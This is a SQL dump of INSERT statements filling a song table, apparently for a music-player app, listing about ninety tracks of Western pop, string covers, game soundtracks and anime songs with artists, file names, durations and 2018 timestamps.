INSERT INTO `song` VALUES (12, 'True Strength - Epic Music', 'John Dreamer', '', '64E5EEA66702422F948B5F219545B5B0_505789075.jpg', '64E5EEA66702422F948B5F219545B5B0_John Dreamer - True Strength - Epic Music.mp3', 0, 0, 0, 205, '2018-08-24 11:35:52', '2018-08-24 11:35:52');
INSERT INTO `song` VALUES (13, 'Weekend', 'Dirk Reichardt', '', '3D9FFF22B10755807B5CB0CD09E7EC1D_1467686087.jpg', '3D9FFF22B10755807B5CB0CD09E7EC1D_Dirk Reichardt - Weekend.mp3', 0, 0, 0, 175, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song` VALUES (14, 'Going Out', '久石譲', '', 'F3B8886B9A5F7FE70A3D58D19BBF21C2_-932109981.jpg', 'F3B8886B9A5F7FE70A3D58D19BBF21C2_久石譲 - Going Out.mp3', 0, 0, 0, 78, '2018-08-24 11:38:51', '2018-08-24 11:38:51');
INSERT INTO `song` VALUES (15, 'Home - String Quartet Tribute to Edward Sharpe and the Magnetic Zeros', 'Vitamin String Quartet', '', '34D2D0D347611128598B3EF5498ACE0A_408084692.jpg', '34D2D0D347611128598B3EF5498ACE0A_Vitamin String Quartet - Home - String Quartet Tribute to Edward Sharpe and the Magnetic Zeros.mp3', 0, 0, 0, 272, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song` VALUES (16, 'Helmet to Helmet', 'Brand X Music', '', '5FB8A8F842C90F980B001203125A0A6E_1913245176.jpg', '5FB8A8F842C90F980B001203125A0A6E_Brand X Music - Helmet to Helmet.mp3', 0, 0, 0, 163, '2018-08-24 11:41:53', '2018-08-24 11:41:53');
INSERT INTO `song` VALUES (17, 'Main Title《冰与火之歌：权力的游戏》配乐', 'Ramin Djawadi', '', '79B34B5F8B1711069AD6A7C7C174355D_495037258.jpg', '79B34B5F8B1711069AD6A7C7C174355D_Ramin Djawadi - Main Title.mp3', 0, 0, 0, 106, '2018-08-24 11:43:34', '2018-08-24 11:43:34');
INSERT INTO `song` VALUES (18, 'See You Again《速度与激情7》致敬保罗沃克插曲', 'Wiz Khalifa', '', '5BCC69EB85D66CD8AB582541D41191F9_512712013.jpg', '5BCC69EB85D66CD8AB582541D41191F9_Wiz Khalifa,Charlie Puth - See You Again.mp3', 0, 0, 0, 231, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song` VALUES (19, 'He\'s a Pirate (From \"Pirates of the Caribbean)', 'Taylor Davis', '', '6DE17F25FFA47EA67903365459E22CB5_-230675359.jpg', '6DE17F25FFA47EA67903365459E22CB5_Taylor Davis - He\'s a Pirate (From ＂Pirates of the Caribbean＂).mp3', 0, 0, 0, 158, '2018-08-24 11:49:47', '2018-08-24 11:49:47');
INSERT INTO `song` VALUES (20, 'Here With You', 'Asher Book', '', 'D8E5FE51344878B33A6576E3DDE4A182_1671520274.jpg', 'D8E5FE51344878B33A6576E3DDE4A182_Asher Book - Here With You.mp3', 0, 0, 0, 226, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song` VALUES (21, 'BLISS <寄生獣 セイの>', 'Ken Arai', '', 'F0F0D4A26FC527B67B81084C2FE58516_1926094732.jpg', 'F0F0D4A26FC527B67B81084C2FE58516_Ken Arai - BLISS.mp3', 0, 0, 0, 224, '2018-08-24 11:53:55', '2018-08-24 11:53:55');
INSERT INTO `song` VALUES (22, 'At The Edge', '千坂', '', 'AF739FB987154371E511E5B6A8FD99EA_-440538018.jpg', 'AF739FB987154371E511E5B6A8FD99EA_千坂 - At The Edge.mp3', 0, 0, 0, 201, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song` VALUES (23, '没什么大不了（なんでもないや）（女声翻唱remix）', 'Maxone / 夏璃夜', '', '6BD0BA42439004DBA709B9C38256DD59_1749049144.jpg', '6BD0BA42439004DBA709B9C38256DD59_Maxone,夏璃夜 - 没什么大不了（なんでもないや）（女声翻唱remix）.mp3', 0, 0, 0, 208, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song` VALUES (24, 'Monster', 'Vitamin String', '', '905FA17FFF9677372B02C80512A93C33_1446065005.jpg', '905FA17FFF9677372B02C80512A93C33_Vitamin String Quartet - Monster.mp3', 0, 0, 0, 194, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song` VALUES (25, 'ONE', 'Aimer', '', '7DD30AD1B4430C09AE41365F215CBA05_-1856783029.jpg', '7DD30AD1B4430C09AE41365F215CBA05_Aimer - ONE.mp3', 0, 0, 0, 332, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song` VALUES (26, 'Secrets', 'Simply Three', '', 'BA70F745C08C3F9E9A74DF890F30CB79_-1967669384.jpg', 'BA70F745C08C3F9E9A74DF890F30CB79_Simply Three - Secrets.mp3', 0, 0, 0, 199, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song` VALUES (27, 'Viva La Vida ', 'Vitamin String Quartet', '', '47AFE3A59D12500270E8348640412F34_-2426296.jpg', '47AFE3A59D12500270E8348640412F34_Vitamin String Quartet - Viva La Vida.mp3', 0, 0, 0, 240, '2018-08-24 12:05:37', '2018-08-24 12:05:37');
INSERT INTO `song` VALUES (28, 'Everything', 'Yinyues', '', '486E8D9E808973AEC4F767949DAB79A4_-2086600378.jpg', '486E8D9E808973AEC4F767949DAB79A4_Yinyues - Everything.mp3', 0, 0, 0, 256, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song` VALUES (29, 'Pirates Of The Caribbean (He\'s A Pirate)《加勒比海盗》', 'Maksim Mrvica', '', '3F8DD958CCF175673954746BA2E683B7_1072319029.jpg', '3F8DD958CCF175673954746BA2E683B7_Maksim Mrvica - Pirates Of The Caribbean (He\'s A Pirate).mp3', 0, 0, 0, 262, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song` VALUES (30, 'Look At Me Now', 'Charlie Puth', '', 'D91AB12527E21BEEFA9DD34FE78B90FC_-1538660113.jpg', 'D91AB12527E21BEEFA9DD34FE78B90FC_Charlie Puth - Look At Me Now.mp3', 0, 0, 0, 198, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song` VALUES (31, '動く、動く', '動く、動く   TV动画《少女终末旅行》片头曲水瀬いのり / 久', '', '07FA78CDB0EF540754CA520E4A53F48C_1136275134.jpg', '07FA78CDB0EF540754CA520E4A53F48C_水瀬いのり,久保ユリカ - 動く、動く.mp3', 0, 0, 0, 277, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song` VALUES (32, 'The Parting Glass', '游戏《刺客信条4：黑旗》结尾曲Assassin\'s Creed Italia', '', '639DA57ACC752E55AE4C27F7921A7610_-2117025252.jpg', '639DA57ACC752E55AE4C27F7921A7610_Assassin\'s Creed Italia - The Parting Glass.mp3', 0, 0, 0, 137, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song` VALUES (33, '優しさの理由  TV动画《冰果》OP1 / TVアニメ「氷菓」OPテーマ', 'ChouCho', '', '7ABC000F2462E51124E67AF6AB5AEFD4_-419535905.jpg', '7ABC000F2462E51124E67AF6AB5AEFD4_ChouCho - 優しさの理由.mp3', 0, 0, 0, 254, '2018-08-24 12:19:33', '2018-08-24 12:19:33');
INSERT INTO `song` VALUES (34, 'DaisyTV动画《境界的彼方》片尾曲 / TVアニメ「境界の彼方」EDテーマ', 'STEREO DIVE FOUNDATION', '', 'A4E16F369B4F5EE23CD5D204D7CC2791_-765359096.jpg', 'A4E16F369B4F5EE23CD5D204D7CC2791_STEREO DIVE FOUNDATION - Daisy.mp3', 0, 0, 0, 276, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song` VALUES (35, 'Faded', 'Robert Mendoza', '', 'DA4A1F94221CC7DBCFDACC33E1F9C7E1_-2088577637.jpg', 'DA4A1F94221CC7DBCFDACC33E1F9C7E1_Robert Mendoza - Faded.mp3', 0, 0, 0, 215, '2018-08-24 12:26:38', '2018-08-24 12:26:38');
INSERT INTO `song` VALUES (36, 'See You Again (Violin Cover)', 'Robert Mendoza', '', 'FEF0B030689BD8DBE5683970F9608ECF_1250670441.jpg', 'FEF0B030689BD8DBE5683970F9608ECF_Robert Mendoza - See You Again (Violin Cover).mp3', 0, 0, 0, 218, '2018-08-24 12:31:08', '2018-08-24 12:31:08');
INSERT INTO `song` VALUES (37, 'EXEC COSMOFLIPS', 'KOKIA', '', 'B6E5E4BF991A89FFA79B14EFD0A8D156_-1833129861.jpg', 'B6E5E4BF991A89FFA79B14EFD0A8D156_KOKIA - EXEC COSMOFLIPS.mp3', 0, 0, 0, 217, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song` VALUES (38, 'Traveling Light', 'Joel Hanson', '', '19780BC2765241E2484B81AD57BE8993_-139806057.jpg', '19780BC2765241E2484B81AD57BE8993_Joel Hanson - Traveling Light.mp3', 0, 0, 0, 209, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song` VALUES (39, 'Dragonfly Keeper', 'Phildel', '', 'BB9AE1531F7D89D44EE1A441350954CA_-162377284.jpg', 'BB9AE1531F7D89D44EE1A441350954CA_Phildel - Dragonfly Keeper.mp3', 0, 0, 0, 130, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song` VALUES (40, 'The Musty Scent of Fresh Pâté 《巫师3》', 'Percival Schuttenbach', '', '7DFE971B96A58AB9B4C6FBB1CD2C7A0F_-1935415289.jpg', '7DFE971B96A58AB9B4C6FBB1CD2C7A0F_Percival Schuttenbach,Przemysław Laszczyk - The Musty Scent of Fresh Pâté.mp3', 0, 0, 0, 141, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song` VALUES (41, 'Glorious Morning游戏《战争进化史》/《米拉奇战记》配乐', 'Waterflame', '', '765131B2A50F2AE1BBC4F2D0CBD6CDFD_1273532572.jpg', '765131B2A50F2AE1BBC4F2D0CBD6CDFD_Waterflame - Glorious Morning.mp3', 0, 0, 0, 163, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song` VALUES (42, 'The Slopes of the Blessure《巫师3》', 'Piotr Musial', '', '42923F2BC911C228862F7FDB2035B890_-1935415289.jpg', '42923F2BC911C228862F7FDB2035B890_Piotr Musial - The Slopes of the Blessure.mp3', 0, 0, 0, 242, '2018-08-24 12:43:00', '2018-08-24 12:43:00');
INSERT INTO `song` VALUES (43, 'My Songs Know What You Did in the Dark (Light Em Up) [String ', 'Vitamin String Quartet', '', '1C20AE3B7A8CA4526213AFB42E1580DE_156066352.jpg', '1C20AE3B7A8CA4526213AFB42E1580DE_Vitamin String Quartet - My Songs Know What You Did in the Dark (Light Em Up) [String.mp3', 0, 0, 0, 189, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song` VALUES (44, 'Empire Of Angels', 'Two Steps From Hell', '', '7ABA588172EBA831089957DDC406DF51_272645281.jpg', '7ABA588172EBA831089957DDC406DF51_Two Steps From Hell - Empire Of Angels.mp3', 0, 0, 0, 315, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song` VALUES (45, 'Roundtable Rival', 'Lindsey Stirling', '', 'ED29D79B90B54D5A25A0256F5DAD6ABD_-1810012291.jpg', 'ED29D79B90B54D5A25A0256F5DAD6ABD_Lindsey Stirling - Roundtable Rival.mp3', 0, 0, 0, 203, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song` VALUES (46, 'For The Win ', 'Two Steps From Hell', '', '6E7D6C060975269382480768FB152110_-1554497447.jpg', '6E7D6C060975269382480768FB152110_Two Steps From Hell - For The Win.mp3', 0, 0, 0, 131, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song` VALUES (47, 'The Moon Represents My Heart', 'Kenny G', '', 'AA5E2950EAE848208E4E8D38D0F72D12_735279475.jpg', 'AA5E2950EAE848208E4E8D38D0F72D12_Kenny G - The Moon Represents My Heart.mp3', 0, 0, 0, 215, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song` VALUES (48, 'アイロニ ', '4円', '', 'F645CCDDDD3E36FDA0AC40C43BF86038_1898872781.jpg', 'F645CCDDDD3E36FDA0AC40C43BF86038_4円 - アイロニ.mp3', 0, 0, 0, 251, '2018-08-24 12:52:53', '2018-08-24 12:52:53');
INSERT INTO `song` VALUES (49, '夢灯籠,动画电影《你的名字。》OP', 'RADWIMPS', '', '03D33478F358DC8D544367F541802521_764910471.jpg', '03D33478F358DC8D544367F541802521_RADWIMPS - 夢灯籠.mp3', 0, 0, 0, 132, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song` VALUES (50, 'The Right Path', 'Thomas Greenberg', '', 'F8493BD7BD0AB097CC0CE129E6400EF7_1946327538.jpg', 'F8493BD7BD0AB097CC0CE129E6400EF7_Thomas Greenberg - The Right Path.mp3', 0, 0, 0, 148, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song` VALUES (51, 'What Are You Waiting For?', 'Nickelback', '', '9715B6B046EB47393ACE4AA7F431AE30_-1398143320.jpg', '9715B6B046EB47393ACE4AA7F431AE30_Nickelback - What Are You Waiting For？.mp3', 0, 0, 0, 220, '2018-08-24 12:58:32', '2018-08-24 12:58:32');
INSERT INTO `song` VALUES (52, 'Astronaut', 'Simple Plan', '', '83646B19329BB51A336D70F85AF6306E_809285913.jpg', '83646B19329BB51A336D70F85AF6306E_Simple Plan - Astronaut.mp3', 0, 0, 0, 221, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song` VALUES (53, 'Good Time ', 'Alex Goot', '', 'C40B7B42226C65BF1DF9C109E90DA6ED_364477548.jpg', 'C40B7B42226C65BF1DF9C109E90DA6ED_Alex Goot,Against the Current - Good Time.mp3', 0, 0, 0, 170, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song` VALUES (54, 'Out of Breath ', 'Jared Lee', '', '09880F0192F3DA1C3F6BAB0E22117EDC_1831665210.jpg', '09880F0192F3DA1C3F6BAB0E22117EDC_Jared Lee - Out of Breath.mp3', 0, 0, 0, 206, '2018-08-24 13:05:47', '2018-08-24 13:05:47');
INSERT INTO `song` VALUES (55, 'Beautiful In White (Demo)', 'Westlife', '', 'C7DD39C631C83DF5D66BDAD592C59027_1587200431.jpg', 'C7DD39C631C83DF5D66BDAD592C59027_Westlife - Beautiful In White (Demo).mp3', 0, 0, 0, 232, '2018-08-24 13:07:34', '2018-08-24 13:07:34');
INSERT INTO `song` VALUES (56, '君の知らない物語,TVアニメ「化物語」EDテーマ', 'Supercell', '', '69AB0EFF523AFF48E959E8E29E85554B_189516196.jpg', '69AB0EFF523AFF48E959E8E29E85554B_Supercell - 君の知らない物語.mp3', 0, 0, 0, 341, '2018-08-24 13:09:22', '2018-08-24 13:09:22');
INSERT INTO `song` VALUES (57, 'In Between The Lines ', 'Tyrone Wells', '', '796409E53B945C6834751AE3EF946CFC_1771943092.jpg', '796409E53B945C6834751AE3EF946CFC_Tyrone Wells - In Between The Lines.mp3', 0, 0, 0, 232, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song` VALUES (58, 'コクハクワープ', 'BPM15Q', '', '5382EDEEAF117E1E5CF0018F90310E2B_1165512884.jpg', '5382EDEEAF117E1E5CF0018F90310E2B_BPM15Q - コクハクワープ.mp3', 0, 0, 0, 206, '2018-08-24 13:12:59', '2018-08-24 13:12:59');
INSERT INTO `song` VALUES (59, '桃源恋歌 ', 'GARNiDELiA', '', '950BCEA8F71D102E93B89EC8D15EDBF3_-243739793.jpg', '950BCEA8F71D102E93B89EC8D15EDBF3_GARNiDELiA - 桃源恋歌.mp3', 0, 0, 0, 232, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song` VALUES (60, 'Freesia  TV动画《樱花任务》片尾曲 / TVアニメ「サクラクエスト」EDテー', '(K)NoW_NAME', '', '0C2CD063990857F4C7965EE55D9DD52E_1335005465.jpg', '0C2CD063990857F4C7965EE55D9DD52E_(K)NoW_NAME - Freesia.mp3', 0, 0, 0, 249, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song` VALUES (61, 'On My Own ', 'Ashes Remain', '', 'EC53D374168B6A04DEABBEC17801F489_1968085383.jpg', 'EC53D374168B6A04DEABBEC17801F489_Ashes Remain - On My Own.mp3', 0, 0, 0, 173, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song` VALUES (62, '7 Years  ', 'Madilyn Bailey', '', '3097C7E86F5B84A6A26F515BDE14F710_1797383775.jpg', '3097C7E86F5B84A6A26F515BDE14F710_Madilyn Bailey,Josh Evans - 7 Years.mp3', 0, 0, 0, 153, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song` VALUES (63, 'Glad You Came ', 'Boyce Avenue', '', 'EBE75A9551E4587B92568479E304EE5D_-15141256.jpg', 'EBE75A9551E4587B92568479E304EE5D_Boyce Avenue - Glad You Came.mp3', 0, 0, 0, 196, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song` VALUES (64, 'ロミオとシンデレラ', '花たん', '', '7BB9DA639287D4AB0981657B968C93DA_1352440724.jpg', '7BB9DA639287D4AB0981657B968C93DA_花たん - ロミオとシンデレラ.mp3', 0, 0, 0, 279, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song` VALUES (65, 'Soldier ', 'Fleurie', '', 'BC11C21694540B7AFB0939E39A21630A_903810065.jpg', 'BC11C21694540B7AFB0939E39A21630A_Fleurie - Soldier.mp3', 0, 0, 0, 225, '2018-08-24 13:27:11', '2018-08-24 13:27:11');
INSERT INTO `song` VALUES (66, 'River (Original Mix)', 'Axero', '', '23E8E28BF24761CE1BBF0FD409938857_14695122.jpg', '23E8E28BF24761CE1BBF0FD409938857_Axero - River (Original Mix).mp3', 0, 0, 0, 224, '2018-08-24 13:28:43', '2018-08-24 13:28:43');
INSERT INTO `song` VALUES (67, 'Sitting Next To You', 'Mokoa', '', '95E6EAE25430E63FDE7372A00BB6F480_2119304293.jpg', '95E6EAE25430E63FDE7372A00BB6F480_Mokoa - Sitting Next To You.mp3', 0, 0, 0, 223, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song` VALUES (68, '恋爱サーキュレーション,TV动画《化物语》OP4 / TVアニメ「化物語」OP4テ', '花澤香菜', '', '1F0260D897FF55341CC0A57913977A7B_-1140913936.jpg', '1F0260D897FF55341CC0A57913977A7B_花澤香菜 - 恋爱サーキュレーション.mp3', 0, 0, 0, 254, '2018-08-24 13:32:57', '2018-08-24 13:32:57');
INSERT INTO `song` VALUES (69, 'SAIKA ', 'RABPIT', '', 'D9511A1C5D1F39BBA23895690F9B6995_1806796267.jpg', 'D9511A1C5D1F39BBA23895690F9B6995_RABPIT - SAIKA.mp3', 0, 0, 0, 272, '2018-08-24 13:34:46', '2018-08-24 13:34:46');
INSERT INTO `song` VALUES (70, 'EuroDancer ', 'Klave', '', '0C52A35D695D476405D087EA1CE8C776_-2140234733.jpg', '0C52A35D695D476405D087EA1CE8C776_Klave - EuroDancer.mp3', 0, 0, 0, 210, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song` VALUES (71, 'A Story You Won\'t Believe 《巫师3》', 'Marcin Przybyłowicz', '', '28783667C0383F28829C6864B270100F_-279046889.jpg', '28783667C0383F28829C6864B270100F_Marcin Przybyłowicz - A Story You Won\'t Believe.mp3', 0, 0, 0, 98, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song` VALUES (72, 'Spirits ', 'KOKIA', '', 'F342A210D4A3F8C0E121ED86543B69A9_1447304680.jpg', 'F342A210D4A3F8C0E121ED86543B69A9_KOKIA - Spirits.mp3', 0, 0, 0, 297, '2018-08-24 13:39:29', '2018-08-24 13:39:29');
INSERT INTO `song` VALUES (73, 'Energy Drink ', 'Virtual Riot', '', 'E994BFA4B070D441DEFE8D63074BC6F7_2121933112.jpg', 'E994BFA4B070D441DEFE8D63074BC6F7_Virtual Riot - Energy Drink.mp3', 0, 0, 0, 304, '2018-08-24 13:40:31', '2018-08-24 13:40:31');
INSERT INTO `song` VALUES (74, '深海少女 (Live)', '圈9', '', '562C474822434BA100EC7F3F3E64A124_1925030134.jpg', '562C474822434BA100EC7F3F3E64A124_圈9 - 深海少女 (Live).mp3', 0, 0, 0, 261, '2018-08-24 13:42:53', '2018-08-24 13:42:53');
INSERT INTO `song` VALUES (75, 'Last One Standing ', 'Simple Plan', '', '301D3F5C46DD2A0A55B840D0A85362D7_809285913.jpg', '301D3F5C46DD2A0A55B840D0A85362D7_Simple Plan - Last One Standing.mp3', 0, 0, 0, 207, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song` VALUES (76, 'A Hero Will Rise', 'Future World Music', '', '80A5CB2CB8E32F55B51F44B551D31B86_1051935244.jpg', '80A5CB2CB8E32F55B51F44B551D31B86_Future World Music - A Hero Will Rise.mp3', 0, 0, 0, 232, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song` VALUES (77, 'black bullet TV动画《漆黑的子弹》片头曲 / TVアニメ「ブラック・ブレット」', 'fripSide', '', '7C0222C5A8F8AE87D9C6911C89126A23_625120628.jpg', '7C0222C5A8F8AE87D9C6911C89126A23_fripSide - black bullet.mp3', 0, 0, 0, 262, '2018-08-24 13:48:23', '2018-08-24 13:48:23');
INSERT INTO `song` VALUES (78, '光るならTV动画《四月是你的谎言》OP1 / TVアニメ「四月は君の嘘」OP1', 'Goose house', '', 'E42E1A624B76736D4C68C755287A8EB2_-760306624.jpg', 'E42E1A624B76736D4C68C755287A8EB2_Goose house - 光るなら.mp3', 0, 0, 0, 254, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song` VALUES (79, '心做し ', '花たん', '', '52F9A95BCAA115E09F705D820593F483_402360274.jpg', '52F9A95BCAA115E09F705D820593F483_花たん - 心做し.mp3', 0, 0, 0, 269, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song` VALUES (80, 'いつもこの場所で', '彩音', '', '8EF8004F2564392C91FBFCCCFB76F78D_-370063849.jpg', '8EF8004F2564392C91FBFCCCFB76F78D_彩音 - いつもこの場所で.mp3', 0, 0, 0, 321, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song` VALUES (81, 'Counting Stars ', 'Simply Three', '', 'DEF2B62139A3BDCD3D44809EEACC5153_1898282060.jpg', 'DEF2B62139A3BDCD3D44809EEACC5153_Simply Three - Counting Stars.mp3', 0, 0, 0, 235, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song` VALUES (82, 'I Just Wanna Run', 'Kait Weston', '', '91E4BF14B67A7BB75223CD0B066DACCA_1692267140.jpg', '91E4BF14B67A7BB75223CD0B066DACCA_Kait Weston - I Just Wanna Run.mp3', 0, 0, 0, 189, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
INSERT INTO `song` VALUES (83, 'コネクト - 双声道版', '小緣', '', 'DEF1D125AF79C0A7F006D396FE1D76EF_402360274.jpg', 'DEF1D125AF79C0A7F006D396FE1D76EF_小緣 - コネクト - 双声道版.mp3', 0, 0, 0, 271, '2018-08-24 14:15:59', '2018-08-24 14:15:59');
INSERT INTO `song` VALUES (84, 'crossing field ', 'LiSA', '', '446EF0529C56BFE01BAE2F3F7F555BED_-8129120.jpg', '446EF0529C56BFE01BAE2F3F7F555BED_LiSA - crossing field.mp3', 0, 0, 0, 251, '2018-08-24 14:17:00', '2018-08-24 14:17:00');
INSERT INTO `song` VALUES (85, 'Escape', 'Dripice', '', 'D17856107ED52DF9DD24B818BB5124F4_-988072244.jpg', 'D17856107ED52DF9DD24B818BB5124F4_Dripice - Escape.mp3', 0, 0, 0, 183, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song` VALUES (86, '宿敌 ', '光宗信吉', '', '078EE30E507A9A317C2CAA04FD020598_2112355719.jpg', '078EE30E507A9A317C2CAA04FD020598_光宗信吉 - 宿敌.mp3', 0, 0, 0, 138, '2018-08-24 14:19:15', '2018-08-24 14:19:15');
INSERT INTO `song` VALUES (87, 'サムライハート(Some Like It Hot!!)', 'SPYAIR', '', 'B0EC784765219B201D4A957E1017EFBD_-1818582117.jpg', 'B0EC784765219B201D4A957E1017EFBD_SPYAIR - サムライハート(Some Like It Hot!!).mp3', 0, 0, 0, 190, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song` VALUES (88, 'Hacking to the Gate', 'いとうかなこ', '', '245B5508E8FD570F651127626D76C2AB_-1465335642.jpg', '245B5508E8FD570F651127626D76C2AB_いとうかなこ - Hacking to the Gate.mp3', 0, 0, 0, 256, '2018-08-24 14:22:20', '2018-08-24 14:22:20');
INSERT INTO `song` VALUES (89, '炼狱、极昼', 'V.A', '', 'A8936C3DA967CB8C43FC4B8D1472FA20_-1583711673.jpg', 'A8936C3DA967CB8C43FC4B8D1472FA20_V.A. - 炼狱、极昼.mp3', 0, 0, 0, 81, '2018-08-24 14:24:13', '2018-08-24 14:24:13');
INSERT INTO `song` VALUES (90, 'ツナ覚醒', '佐橋俊彦', '', '31C80D365B6C32D523F1F08E5428A061_402360274.jpg', '31C80D365B6C32D523F1F08E5428A061_佐橋俊彦 - ツナ覚醒.mp3', 0, 0, 0, 98, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song` VALUES (91, '緋色の空 ', '川田まみ', '', '015B5D7A0051DF7DE2E5F7F89C3BA8FC_-881704851.jpg', '015B5D7A0051DF7DE2E5F7F89C3BA8FC_川田まみ - 緋色の空.mp3', 0, 0, 0, 256, '2018-08-24 14:26:06', '2018-08-24 14:26:06');
INSERT INTO `song` VALUES (92, 'Intro', 'The xx', '', '41F5675034A03D6F2045F9A5EF37EB05_1136843025.jpg', '41F5675034A03D6F2045F9A5EF37EB05_The xx - Intro.mp3', 0, 0, 0, 128, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song` VALUES (93, 'PneumaticTokyo', 'EnV', '', '945FB8758E670F29CF561B4562740806_-1900201219.jpg', '945FB8758E670F29CF561B4562740806_EnV - PneumaticTokyo.mp3', 0, 0, 0, 228, '2018-08-24 14:29:38', '2018-08-24 14:29:38');
INSERT INTO `song` VALUES (94, 'River Flows In You (Single MG Mix) - remix', 'Jasper Forks', '', '6993B05975A608316B652AB358FCF32B_-230226469.jpg', '6993B05975A608316B652AB358FCF32B_Jasper Forks - River Flows In You (Single MG Mix) - remix.mp3', 0, 0, 0, 236, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song` VALUES (95, 'Last Of The Wild', 'Nightwish', '', 'D7C61DD7729CE64EB6D94557E0939188_24068971.jpg', 'D7C61DD7729CE64EB6D94557E0939188_Nightwish - Last Of The Wilds.mp3', 0, 0, 0, 341, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song` VALUES (96, 'only my railgun  ', 'fripSide', '', '476586E80E6D473E47F2A53233FB669C_1437406009.jpg', '476586E80E6D473E47F2A53233FB669C_fripSide - only my railgun.mp3', 0, 0, 0, 257, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song` VALUES (97, 'Juste une photo de toi', 'Matt Pokora', '', '0D52A44D9E6866E0E559D55D1FE5BAA2_-1369063131.jpg', '0D52A44D9E6866E0E559D55D1FE5BAA2_Matt Pokora - Juste une photo de toi.mp3', 0, 0, 0, 231, '2018-08-24 14:34:03', '2018-08-24 14:34:03');
INSERT INTO `song` VALUES (98, 'Love Story', 'Various Artists', '', '572B2E26217293149E507B89403AD584_402360274.jpg', '572B2E26217293149E507B89403AD584_Various Artists - Love Story.mp3', 0, 0, 0, 235, '2018-08-24 14:35:37', '2018-08-24 14:35:37');
INSERT INTO `song` VALUES (99, 'Masked Heroes', 'Vexento', '', '0003C03188B79CA821EDC12F0512BEB6_1403977878.jpg', '0003C03188B79CA821EDC12F0512BEB6_Vexento - Masked Heroes.mp3', 0, 0, 0, 211, '2018-08-24 14:37:11', '2018-08-24 14:37:11');
INSERT INTO `song` VALUES (100, 'El Dorado Dubstep (Remix) - remix', 'Two Steps From Hell', '', 'E52EFDD2DCC4A4CEA88F42405C820095_-238839201.jpg', 'E52EFDD2DCC4A4CEA88F42405C820095_Two Steps From Hell - El Dorado Dubstep (Remix) - remix.mp3', 0, 0, 0, 186, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song` VALUES (101, 'The Saltwater Room', 'Owl City', '', 'F9671311687B969B01D9F71EC94337FF_-468605825.jpg', 'F9671311687B969B01D9F71EC94337FF_Owl City,Breanne Düren - The Saltwater Room.mp3', 0, 0, 0, 296, '2018-08-24 14:45:01', '2018-08-24 14:45:01');
INSERT INTO `song` VALUES (102, 'Valder Fields ', 'Tamas Wells', '', 'E7919ECEA3D6E9A58445442F49338149_-691148680.jpg', 'E7919ECEA3D6E9A58445442F49338149_Tamas Wells - Valder Fields.mp3', 0, 0, 0, 159, '2018-08-24 14:46:51', '2018-08-24 14:46:51');
INSERT INTO `song` VALUES (103, 'アイロニ', '鹿乃', '', '24B75F4F6D8EEFC4CE67526644EB8965_1781113000.jpg', '24B75F4F6D8EEFC4CE67526644EB8965_鹿乃 - アイロニ.mp3', 0, 0, 0, 250, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
